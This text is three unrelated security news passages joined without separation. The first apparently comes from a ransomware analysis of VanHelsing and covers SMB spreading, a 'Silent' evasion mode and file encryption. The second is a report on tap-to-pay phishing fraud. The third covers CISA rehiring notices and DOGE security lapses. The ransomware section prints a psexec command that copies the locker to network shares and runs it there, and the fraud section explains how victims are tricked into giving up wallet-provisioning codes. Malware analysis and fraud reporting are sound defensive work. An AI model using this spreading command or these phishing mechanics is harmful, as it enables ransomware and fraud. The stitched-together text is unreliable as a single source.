&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31255" height="249" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId55.png" width="842" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10 — Scanning IP for open SMB port.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;For each running SMB server, the ransomware will call &lt;code&gt;NetShareEnum&lt;/code&gt; and proceed to construct a network path to access a shared resource on the remote machine. Then, the ransomware continues with folder and file enumeration, followed by encryption. It is worth mentioning that in &amp;#8220;Silent&amp;#8221; mode, network shares will have their files encrypted without the extension being changed to &lt;code&gt;.vanhelsing&lt;/code&gt;.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="smb-spreading-encryption"&gt;SMB Spreading &amp;amp; Encryption&lt;/h3&gt;



&lt;p&gt;If the ransomware is executed with the &lt;code&gt;--spread-smb&lt;/code&gt; command-line argument, it still encrypts network shares, but the approach differs from the one mentioned above. The ransomware contains an embedded &lt;a href="https://www.virustotal.com/gui/file/078163d5c16f64caa5a14784323fd51451b8c831c73396b967b4e35e6879937b"&gt;&lt;code&gt;psexec.exe&lt;/code&gt;&lt;/a&gt; binary, which is dropped into the Temp folder. Similar to network encryption, the malware will scan for SMB shares and try to determine if the share has write permissions. Network shares containing &lt;code&gt;NETLOGON&lt;/code&gt; or &lt;code&gt;sysvol&lt;/code&gt; are excluded from encryption, as encrypting them could potentially interrupt user authentication.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31261" height="230" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId60.png" width="754" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11 — Excluding NETLOGON and sysvol shares.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;VanHelsing locker will copy itself to the network share as &lt;code&gt;$SHARE\\\\vanlocker.exe&lt;/code&gt;. Executing &lt;code&gt;psexec.exe&lt;/code&gt; will trigger the ransomware process on the network share, which will then proceed to encrypt the files. The ransomware on the share will execute without encrypting mounted or other network shares. Below are the execution arguments:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;cmd.exe /c $TEMP/psexec.exe -accepteula \\\\$SHARE -c -f $SHARE\\vanlocker.exe -d --no-mounted --no-network &amp;lt; NUL&lt;/pre&gt;



&lt;h3 class="wp-block-heading" id="silent-encryption-mode"&gt;Silent Encryption Mode&lt;/h3&gt;



&lt;p&gt;To avoid triggering detection flags added in the latest version, the ransomware includes the &lt;code&gt;--Silent&lt;/code&gt; command-line argument. When this flag is specified, the ransomware splits its functionality into two parts. &lt;/p&gt;



&lt;p&gt;During &amp;#8220;Normal&amp;#8221; execution, the ransomware:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Enumerates folders.&lt;/li&gt;



&lt;li&gt;Enumerates files.&lt;/li&gt;



&lt;li&gt;Encrypts files.&lt;/li&gt;



&lt;li&gt;Renames files with the ransomware extension.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;In “Silent” mode, the ransomware temporarily skips the file renaming step (Step 4). Once all the files have been encrypted, it enumerates folders and files once again, this time solely for renaming the files with the ransomware extension.&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Enumerates folders.&lt;/li&gt;



&lt;li&gt;Enumerates files.&lt;/li&gt;



&lt;li&gt;Encrypts all files.&lt;/li&gt;
&lt;/ol&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The machine is encrypted.&lt;/li&gt;
&lt;/ul&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Enumerates folders.&lt;/li&gt;



&lt;li&gt;Enumerates files.&lt;/li&gt;



&lt;li&gt;Renames files with the ransomware extension.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Under the hood the malware implements this by having the encryption routine accept an argument specifying &lt;code&gt;Normal&lt;/code&gt; or &lt;code&gt;Silent&lt;/code&gt; operation. These don’t exactly correspond to whether the CLI flag is set: &lt;code&gt;Silent&lt;/code&gt; only renames files (adding the &lt;code&gt;.vanhelsing&lt;/code&gt; extension) without encrypting, whereas &lt;code&gt;Normal&lt;/code&gt; encrypts and renames files, but skips the renaming if &lt;code&gt;--silent&lt;/code&gt; is set. Execution without &lt;code&gt;--silent&lt;/code&gt; is implemented by just running &lt;code&gt;Normal&lt;/code&gt;, whereas execution with &lt;code&gt;--silent&lt;/code&gt; is implemented by first running &lt;code&gt;Normal&lt;/code&gt; (which now skips file renaming) and then running &lt;code&gt;Silent&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31263" height="122" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId64-2.png" width="710" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12 — Double “Encryption”, Normal &amp;amp; Silent mode.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;

&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31264" height="240" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId67.png" width="702" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13 — Normal encryption function, Silent flag skipping renaming.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;When the &lt;code&gt;Silent&lt;/code&gt; argument is passed to the function, it is solely responsible for adding the ransomware extension and nothing else. Before this, the same function was executed with the &lt;code&gt;Normal&lt;/code&gt; flag, which is responsible for the encryption.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31265" height="361" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId70-1.png" width="782" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14 — Silent encryption function.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The ransomware follows this two-stage process in &lt;strong&gt;Silent mode&lt;/strong&gt; primarily to evade detection and bypass security measures, such as behavioral detection.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="file-encryption"&gt;File Encryption&lt;/h3&gt;



&lt;p&gt;The ransomware contains a &lt;strong&gt;Curve25519&lt;/strong&gt; public key embedded in the code. Two random ephemeral values, sized 32 bytes and 12 bytes, are generated per each encrypted file to use as the key and nonce for file encryption using the &lt;strong&gt;ChaCha20&lt;/strong&gt; algorithm. These are in turn encrypted using the public key, and the result is formatted into a hexadecimal format to be stored in the file.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31266" height="109" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId74-1.png" width="825" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15 — Random keys generation and encryption.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;If the file size is approximately 1GB (0x3E800000 bytes) or larger, the ransomware will encrypt only the first 30% of the file contents, starting from the beginning. If the file size is smaller, the entire file will be encrypted. The contents are encrypted in chunks of approximately 1MB (0x100000 bytes).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31267" height="331" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId77.png" width="521" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16 — File size check and encryption.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;VanHelsing Ransomware Encrypted File Structure:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;---key---$KEY_HEX---endkey------nonce---$NONCE_HEX---endnonce--$ENCRYPTED_CHUNKS&lt;/pre&gt;



&lt;p&gt;If the &lt;code&gt;--Silent&lt;/code&gt; flag is not set, the file ransomware extension is added immediately. Otherwise, once all the files are encrypted, they are enumerated again, and the extension is changed.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;VanHelsingRaaS&lt;/strong&gt;, a rapidly expanding ransomware-as-a-service program launched in March 2025, has quickly made its mark on the cybercrime landscape. Offering an accessible entry point for affiliates with a low deposit has attracted a diverse range of participants. The program&amp;#8217;s growth is evident in the evolution of its ransomware variants, which have expanded beyond Windows with additional offerings targeting &amp;#8220;Linux, BSD, ARM, and ESXi systems&amp;#8221;. With a user-friendly control panel and frequent updates, VanHelsing is becoming a powerful tool for cybercriminals. Within just two weeks of its launch, it has already caused significant damage, infecting multiple victims and demanding hefty ransoms. This rapid escalation underscores the program&amp;#8217;s effectiveness and the evolving nature of ransomware threats, emphasizing the need for robust cybersecurity measures to combat such sophisticated attacks.&lt;/p&gt;

Details released by authorities so far indicate the mobile wallets being used by the scammers were created through online phishing scams, and that the accused were relying on a custom Android app to relay tap-to-pay transactions from mobile devices located in China.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70773" style="width: 758px;"&gt;&lt;img alt="" class=" wp-image-70773" height="413" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/kcso-taptopay.png" width="748" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70773"&gt;Image: WLVT-8.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Authorities in Knoxville, Tennessee last week &lt;a href="https://knoxsheriff.org/tap-2-pay-fraud-scheme-bust/" rel="noopener" target="_blank"&gt;said&lt;/a&gt; they arrested 11 Chinese nationals accused of buying tens of thousands of dollars worth of gift cards at local retailers with mobile wallets created through online phishing scams. The Knox County Sheriff&amp;#8217;s office said the arrests are considered the first in the nation for a new type of tap-to-pay fraud.&lt;/p&gt;
&lt;p&gt;Responding to questions about what makes this scheme so remarkable, Knox County said that while it appears the fraudsters are simply buying gift cards, in fact they are using multiple transactions to purchase various gift cards and are plying their scam from state to state.&lt;/p&gt;
&lt;p&gt;&amp;#8220;These offenders have been traveling nationwide, using stolen credit card information to purchase gift cards and launder funds,&amp;#8221; Knox County Chief Deputy &lt;strong&gt;Bernie Lyon&lt;/strong&gt; wrote. &amp;#8220;During Monday’s operation, we recovered gift cards valued at over $23,000, all bought with unsuspecting victims’ information.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Asked for specifics about the mobile devices seized from the suspects, Lyon said &amp;#8220;tap-to-pay fraud involves a group &lt;em&gt;utilizing Android phones to conduct Apple Pay transactions&lt;/em&gt; utilizing stolen or compromised credit/debit card information,&amp;#8221; [emphasis added].&lt;/p&gt;
&lt;p&gt;Lyon declined to offer additional specifics about the mechanics of the scam, citing an ongoing investigation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ford Merrill&lt;/strong&gt; works in security research at &lt;a href="https://www.secalliance.com/" rel="noopener" target="_blank"&gt;SecAlliance&lt;/a&gt;, a &lt;a href="https://www.csis.com/" rel="noopener" target="_blank"&gt;CSIS Security Group&lt;/a&gt; company. Merrill said there aren&amp;#8217;t many valid use cases for Android phones to transmit Apple Pay transactions. That is, he said, unless they are running a custom Android app that KrebsOnSecurity wrote about last month as part of &lt;a href="https://krebsonsecurity.com/2025/02/how-phished-data-turns-into-apple-google-wallets/" rel="noopener" target="_blank"&gt;a deep dive into the operations of China-based phishing cartels&lt;/a&gt; that are breathing new life into the payment card fraud industry (a.k.a. &amp;#8220;carding&amp;#8221;).&lt;/p&gt;
&lt;p&gt;How are these China-based phishing groups obtaining stolen payment card data and then loading it onto Google and Apple phones? It all starts with phishing.&lt;/p&gt;
&lt;p&gt;If you own a mobile phone, the chances are excellent that at some point in the past two years it has received at least one phishing message that spoofs the &lt;strong&gt;U.S. Postal Service&lt;/strong&gt; to supposedly collect some outstanding delivery fee, or an SMS that pretends to be a local toll road operator warning of a delinquent toll fee.&lt;/p&gt;
&lt;p&gt;These messages are being sent through sophisticated phishing kits sold by several cybercriminals based in mainland China. And they are not traditional SMS phishing or “&lt;strong&gt;smishing&lt;/strong&gt;” messages, as they bypass the mobile networks entirely. Rather, the missives are sent through the &lt;strong&gt;Apple iMessage&lt;/strong&gt; service and through &lt;a href="https://en.wikipedia.org/wiki/Rich_Communication_Services" rel="noopener" target="_blank"&gt;RCS&lt;/a&gt;, the functionally equivalent technology on &lt;strong&gt;Google&lt;/strong&gt; phones.&lt;/p&gt;
&lt;p&gt;People who enter their payment card data at one of these sites will be told their financial institution needs to verify the small transaction by sending a one-time passcode to the customer’s mobile device. In reality, that code will be sent by the victim’s financial institution in response to a request by the fraudsters to link the phished card data to a mobile wallet.&lt;/p&gt;
&lt;p&gt;If the victim then provides that one-time code, the phishers will link the card data to a new mobile wallet from Apple or Google, loading the wallet onto a mobile phone that the scammers control. These phones are then loaded with multiple stolen wallets (often between 5-10 per device) and sold in bulk to scammers on Telegram.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70436" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-70436" height="567" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/phishingphones.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70436"&gt;An image from the Telegram channel for a popular Chinese smishing kit vendor shows 10 mobile phones for sale, each loaded with 5-7 digital wallets from different financial institutions.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Merrill found that at least one of the Chinese phishing groups sells an Android app called “&lt;strong&gt;Z-NFC&lt;/strong&gt;” that can relay a valid NFC transaction to anywhere in the world. The user simply waves their phone at a local payment terminal that accepts Apple or Google pay, and the app relays an NFC transaction over the Internet from a phone in China.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I would be shocked if this wasn&amp;#8217;t the NFC relay app,&amp;#8221; Merrill said, concerning the arrested suspects in Tennessee.&lt;/p&gt;
&lt;div style="text-align: center;"&gt;&lt;/div&gt;
&lt;p&gt;Merrill said the Z-NFC software can work from anywhere in the world, and that one phishing gang offers the software for $500 a month.&lt;/p&gt;
&lt;p&gt;&amp;#8220;It can relay both NFC enabled tap-to-pay as well as any digital wallet,&amp;#8221; Merrill said. &amp;#8220;They even have 24-hour support.&amp;#8221;&lt;span id="more-70697"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;On March 16, the ABC affiliate in Sacramento (&lt;strong&gt;ABC10&lt;/strong&gt;), Calif. &lt;a href="https://www.youtube.com/watch?v=dUjaj0d1T6A" rel="noopener" target="_blank"&gt;aired a segment&lt;/a&gt; about two Chinese nationals who were arrested after using an app to run stolen credit cards at a local Target store. The news story quoted investigators saying the men were trying to buy gift cards using a mobile app that cycled through more than 80 stolen payment cards.&lt;/p&gt;
&lt;p&gt;ABC10 reported that while most of those transactions were declined, the suspects still made off with $1,400 worth of gift cards. After their arrests, both men reportedly admitted that they were being paid $250 a day to conduct the fraudulent transactions.&lt;/p&gt;
&lt;p&gt;Merrill said it&amp;#8217;s not unusual for fraud groups to advertise this kind of work on social media networks, including TikTok.&lt;/p&gt;
&lt;p&gt;A &lt;strong&gt;CBS News&lt;/strong&gt; &lt;a href="https://www.cbsnews.com/sacramento/news/sacramento-county-credit-card-scheme-arrest-chinese-nationals/" rel="noopener" target="_blank"&gt;story&lt;/a&gt; on the Sacramento arrests said one of the suspects tried to use 42 separate bank cards, but that 32 were declined. Even so, the man still was reportedly able to spend $855 in the transactions.&lt;/p&gt;
&lt;p&gt;Likewise, the suspect&amp;#8217;s alleged accomplice tried 48 transactions on separate cards, finding success 11 times and spending $633, CBS reported.&lt;/p&gt;
&lt;p&gt;&amp;#8220;It&amp;#8217;s interesting that so many of the cards were declined,&amp;#8221; Merrill said. &amp;#8220;One reason this might be is that banks are getting better at detecting this type of fraud. The other could be that the cards were already used and so they were already flagged for fraud even before these guys had a chance to use them. So there could be some element of just sending these guys out to stores to see if it works, and if not they&amp;#8217;re on their own.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Merrill&amp;#8217;s investigation into the Telegram sales channels for these China-based phishing gangs shows their phishing sites are actively manned by fraudsters who sit in front of giant racks of Apple and Google phones that are used to send the spam and respond to replies in real time.&lt;/p&gt;
&lt;p&gt;In other words, the phishing websites are powered by real human operators as long as new messages are being sent. Merrill said the criminals appear to send only a few dozen messages at a time, likely because completing the scam takes manual work by the human operators in China. After all, most one-time codes used for mobile wallet provisioning are generally only good for a few minutes before they expire.&lt;/p&gt;

The message instructed recently-fired CISA employees to get in touch so they can be rehired and then immediately placed on leave, asking employees to send their Social Security number or date of birth in a password-protected email attachment &amp;#8212; presumably with the password needed to view the file included in the body of the email.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70732" style="width: 757px;"&gt;&lt;img alt="" class=" wp-image-70732" height="371" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/cisa-resinstatement.png" width="747" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70732"&gt;The homepage of cisa.gov as it appeared on Monday and Tuesday afternoon.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;On March 13, a Maryland district court judge &lt;a href="https://www.cbsnews.com/news/fired-cisa-probationary-employees-reinstated/" rel="noopener" target="_blank"&gt;ordered&lt;/a&gt; the Trump administration to reinstate more than 130 probationary CISA employees who were fired last month. On Monday, the administration announced that those dismissed employees would be reinstated but placed on paid administrative leave. They are among nearly 25,000 fired federal workers who are in the process of being rehired.&lt;/p&gt;
&lt;p&gt;A notice covering the CISA homepage said the administration is making every effort to contact those who were unlawfully fired in mid-February.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Please provide a password protected attachment that provides your full name, your dates of employment (including date of termination), and one other identifying factor such as date of birth or social security number,&amp;#8221; the message reads. &amp;#8220;Please, to the extent that it is available, attach any termination notice.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The message didn&amp;#8217;t specify how affected CISA employees should share the password for any attached files, so the implicit expectation is that employees should just include the plaintext password in their message.&lt;/p&gt;
&lt;p&gt;Email is about as secure as a postcard sent through the mail, because anyone who manages to intercept the missive anywhere along its path of delivery can likely read it. In security terms, that&amp;#8217;s the equivalent of encrypting sensitive data while also attaching the secret key needed to view the information.&lt;/p&gt;
&lt;p&gt;What&amp;#8217;s more, a great many antivirus and security scanners have trouble inspecting password-protected files, meaning the administration&amp;#8217;s instructions are likely to increase the risk that malware submitted by cybercriminals could be accepted and opened by U.S. government employees.&lt;/p&gt;
&lt;p&gt;The message in the screenshot above was removed from the CISA homepage Tuesday evening and replaced with a much shorter notice directing former CISA employees to contact a specific email address. But a slightly different version of the same message originally posted to CISA&amp;#8217;s website &lt;a href="https://www.uscis.gov/newsroom/alerts/uscis-probationary-reinstatements" rel="noopener" target="_blank"&gt;still exists&lt;/a&gt; at the website for the &lt;strong&gt;U.S. Citizenship and Immigration Services&lt;/strong&gt;, which likewise instructs those fired employees who wish to be rehired and put on leave to send a password-protected email attachment with sensitive personal data.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70736" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-70736" height="490" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/uscis-probation.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70736"&gt;A message from the White House to fired federal employees at the U.S. Citizenship and Immigration Services instructs recipients to email personal information in a password-protected attachment.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;This is hardly the first example of the administration discarding Security 101 practices in the name of expediency. Last month, the &lt;strong&gt;Central Intelligence Agency&lt;/strong&gt; (CIA) sent an unencrypted email to the White House with the first names and first letter of the last names of recently hired CIA officers who might be easy to fire.&lt;/p&gt;
&lt;p&gt;As cybersecurity journalist &lt;strong&gt;Shane Harris&lt;/strong&gt; &lt;a href="https://www.theatlantic.com/international/archive/2025/02/doge-intelligence-agencies-harm/681667/" rel="noopener" target="_blank"&gt;noted&lt;/a&gt; in &lt;em&gt;The Atlantic&lt;/em&gt;, even those fragments of information could be useful to foreign spies.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Over the weekend, a former senior CIA official showed me the steps by which a foreign adversary who knew only his first name and last initial could have managed to identify him from the single line of the congressional record where his full name was published more than 20 years ago, when he became a member of the Foreign Service,&amp;#8221; Harris wrote. &amp;#8220;The former official was undercover at the time as a State Department employee. If a foreign government had known even part of his name from a list of confirmed CIA officers, his cover would have been blown.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The White House has also fired at least 100 intelligence staffers from the &lt;strong&gt;National Security Agency &lt;/strong&gt;(NSA), reportedly for using an internal NSA chat tool &lt;a href="https://www.nytimes.com/2025/02/25/us/politics/gabbard-nsa-firing-explicit-chat.html" rel="noopener" target="_blank"&gt;to discuss their personal lives and politics&lt;/a&gt;. Testifying before the House Select Committee on the Communist Party earlier this month, the NSA&amp;#8217;s former top cybersecurity official said the Trump administration&amp;#8217;s attempts to mass fire probationary federal employees will be &amp;#8220;devastating&amp;#8221; to U.S. cybersecurity operations.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Rob Joyce&lt;/strong&gt;, who spent 34 years at the NSA, told Congress how important those employees are in sustaining an aggressive stance against China in cyberspace.&lt;/p&gt;
&lt;p&gt;&amp;#8220;At my former agency, remarkable technical talent was recruited into developmental programs that provided intensive unique training and hands-on experience to cultivate vital skills,” Joyce &lt;a href="https://cyberscoop.com/joyce-china-probationary-firings-devastating-congress/?utm_campaign=CyberScoop%20-%20Editorial&amp;amp;utm_content=326616240&amp;amp;utm_medium=social&amp;amp;utm_source=linkedin&amp;amp;hss_channel=lcp-11061843" rel="noopener" target="_blank"&gt;told the panel&lt;/a&gt;. &amp;#8220;Eliminating probationary employees will destroy a pipeline of top talent responsible for hunting and eradicating [Chinese] threats.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Both the message to fired CISA workers and DOGE&amp;#8217;s ongoing efforts to bypass vetted government networks for a faster Wi-Fi signal are emblematic of this administration&amp;#8217;s overall approach to even basic security measures: To go around them, or just pretend they don&amp;#8217;t exist &lt;a href="https://fs.blog/chestertons-fence/" rel="noopener" target="_blank"&gt;for a good reason&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;On Monday, &lt;em&gt;The New York Times&lt;/em&gt; &lt;a href="https://www.nytimes.com/2025/03/17/us/politics/elon-musk-starlink-white-house.html" rel="noopener" target="_blank"&gt;reported&lt;/a&gt; that U.S. Secret Service agents at the White House were briefly on alert last month when a trusted captain of Elon Musk&amp;#8217;s &amp;#8220;Department of Government Efficiency&amp;#8221; (DOGE) visited the roof of the Eisenhower building inside the White House compound &amp;#8212; to see about setting up a dish to receive satellite Internet access directly from Musk&amp;#8217;s &lt;strong&gt;Starlink&lt;/strong&gt; service.&lt;/p&gt;
&lt;p&gt;The White House press secretary told The Times that Starlink had &amp;#8220;donated&amp;#8221; the service and that the gift had been vetted by the lawyer overseeing ethics issues in the White House Counsel’s Office. The White House claims the service is necessary because its wireless network is too slow.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Jake Williams&lt;/strong&gt;, vice president for research and development at the cybersecurity consulting firm &lt;strong&gt;Hunter Strategy&lt;/strong&gt;, told The Times &amp;#8220;it&amp;#8217;s super rare” to install Starlink or another internet provider as a replacement for existing government infrastructure that has been vetted and secured.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I can’t think of a time that I have heard of that,&amp;#8221; Williams said. &amp;#8220;It introduces another attack point,” Williams said. &amp;#8220;But why introduce that risk?&amp;#8221;&lt;/p&gt;
&lt;p&gt;Meanwhile, &lt;strong&gt;NBC News&lt;/strong&gt; &lt;a href="https://www.nbcnews.com/tech/elon-musk/elon-musk-starlink-growing-footprint-federal-government-rcna195400" rel="noopener" target="_blank"&gt;reported on March 7&lt;/a&gt; that Starlink is expanding its footprint across the federal government.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Multiple federal agencies are exploring the idea of adopting SpaceX’s Starlink for internet access — and at least one agency, the General Services Administration (GSA), has done so at the request of Musk’s staff, according to someone who worked at the GSA last month and is familiar with its network operations — despite a vow by Musk and Trump to slash the overall federal budget,&amp;#8221; NBC wrote.&lt;span id="more-70729"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The longtime Musk employee who encountered the Secret Service on the roof in the White House complex was &lt;strong&gt;Christopher Stanley&lt;/strong&gt;, the 33-year-old senior director for security engineering at &lt;strong&gt;X&lt;/strong&gt; and principal security engineer at SpaceX.&lt;/p&gt;
&lt;p&gt;On Monday, Bloomberg broke the news that Stanley had been tapped for a seat on the board of directors at the mortgage giant &lt;strong&gt;Fannie Mae&lt;/strong&gt;. Stanley was added to the board alongside newly confirmed Federal Housing Finance Agency director &lt;a href="https://en.wikipedia.org/wiki/Bill_Pulte" rel="noopener" target="_blank"&gt;Bill Pulte&lt;/a&gt;, the grandson of the late housing businessman and founder of PulteGroup &amp;#8212; William J. Pulte.&lt;/p&gt;
&lt;p&gt;In a nod to his new board role atop an agency that helps drive the nation&amp;#8217;s $12 trillion mortgage market, Stanley retweeted a Bloomberg story about the hire with a smiley emoji and the comment &amp;#8220;Tech Support.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-70750" height="676" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/stanley-fannie.png" width="750" /&gt;&lt;/p&gt;
&lt;p&gt;But earlier today, Bloomberg &lt;a href="https://www.bloomberg.com/news/articles/2025-03-19/musk-ally-stanley-abruptly-resigns-from-fannie-mae-board" rel="noopener" target="_blank"&gt;reported&lt;/a&gt; that Stanley had abruptly resigned from the Fannie board, and that details about the reason for his quick departure weren&amp;#8217;t immediately clear. As &lt;a href="https://krebsonsecurity.com/2025/02/trump-2-0-brings-cuts-to-cyber-consumer-protections/" rel="noopener" target="_blank"&gt;first reported here&lt;/a&gt; last month, Stanley had a brush with celebrity on Twitter in 2015 when he leaked the user database for the DDoS-for-hire service &lt;strong&gt;LizardStresser&lt;/strong&gt;, and soon faced threats of physical violence against his family.&lt;/p&gt;
&lt;p&gt;My &lt;a href="https://krebsonsecurity.com/2015/01/another-lizard-arrested-lizard-lair-hacked/" rel="noopener" target="_blank"&gt;2015 story on that leak&lt;/a&gt; did not name Stanley, but he exposed himself as the source by posting a video about it on his Youtube channel. A review of domain names registered by Stanley shows he went by the nickname “enKrypt,” and was the former owner of a pirated software and hacking forum called &lt;strong&gt;error33[.]net&lt;/strong&gt;, as well as &lt;strong&gt;theC0re&lt;/strong&gt;, a video game cheating community.&lt;/p&gt;
&lt;p&gt;Stanley is one of more than 50 DOGE workers, mostly young men and women who have worked with one or more of Musk&amp;#8217;s companies. The Trump administration remains &lt;a href="https://krebsonsecurity.com/2025/02/teen-on-musks-doge-team-graduated-from-the-com/" rel="noopener" target="_blank"&gt;dogged by questions&lt;/a&gt; about how many &amp;#8212; if any &amp;#8212; of the DOGE workers were put through the gauntlet of a thorough security background investigation before being given access to such sensitive government databases.&lt;/p&gt;
&lt;p&gt;That&amp;#8217;s largely because in one of his first executive actions after being sworn in for a second term on Jan. 20, President Trump &lt;a href="https://www.whitehouse.gov/presidential-actions/2025/01/memorandum-to-resolve-the-backlog-of-security-clearances-for-executive-office-of-the-president-personnel/" rel="noopener" target="_blank"&gt;declared&lt;/a&gt; that the security clearance process was simply too onerous and time-consuming, and that anyone so designated by the White House counsel would have full top secret/sensitive compartmented information (TS/SCI) clearances for up to six months. Translation: We &lt;a href="https://www.youtube.com/watch?v=9IG3zqvUqJY" rel="noopener" target="_blank"&gt;accepted the risk&lt;/a&gt;, so TAH-DAH! No risk!&lt;/p&gt;
&lt;p&gt;Presumably, this is the same counsel who saw no ethical concerns with Musk &amp;#8220;donating&amp;#8221; Starlink to the White House, or with President Trump summoning the media to film him hawking Cybertrucks and Teslas (a.k.a. &amp;#8220;Teslers&amp;#8221;) on the White House lawn last week.&lt;/p&gt;
&lt;div style="text-align: center;"&gt;&lt;/div&gt;
&lt;p&gt;Mr. Musk&amp;#8217;s unelected role as head of an ad hoc executive entity that is gleefully firing federal workers and feeding federal agencies into &amp;#8220;the wood chipper&amp;#8221; has seen his Tesla stock price plunge in recent weeks, while firebombings and other vandalism attacks on property carrying the Tesla logo are cropping up across the U.S. and overseas and driving down Tesla sales.&lt;/p&gt;
&lt;p&gt;President Trump and his attorney general Pam Bondi have dubiously asserted that those responsible for attacks on Tesla dealerships are committing &amp;#8220;domestic terrorism,&amp;#8221; and that vandals will be prosecuted accordingly. But it&amp;#8217;s not clear this administration would recognize a real domestic security threat if it was ensconced squarely behind the Resolute Desk.&lt;/p&gt;
&lt;p&gt;Or at the pinnacle of the &lt;strong&gt;Federal Bureau of Investigation&lt;/strong&gt; (FBI). &lt;em&gt;The Washington Post&lt;/em&gt; &lt;a href="https://www.washingtonpost.com/national-security/2025/02/07/patel-fbi-russia-lopatonok/" rel="noopener" target="_blank"&gt;reported&lt;/a&gt; last month that Trump&amp;#8217;s new FBI director &lt;strong&gt;Kash Patel&lt;/strong&gt; was paid $25,000 last year by a film company owned by a dual U.S. Russian citizen that has made programs promoting &amp;#8220;deep state&amp;#8221; conspiracy theories pushed by the Kremlin.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The resulting six-part documentary appeared on Tucker Carlson’s online network, itself a reliable conduit for Kremlin propaganda,&amp;#8221; The Post reported. &amp;#8220;In the film, Patel made his now infamous pledge to shut down the FBI’s headquarters in Washington and &amp;#8216;open it up as a museum to the deep state.'&amp;#8221;&lt;/p&gt;
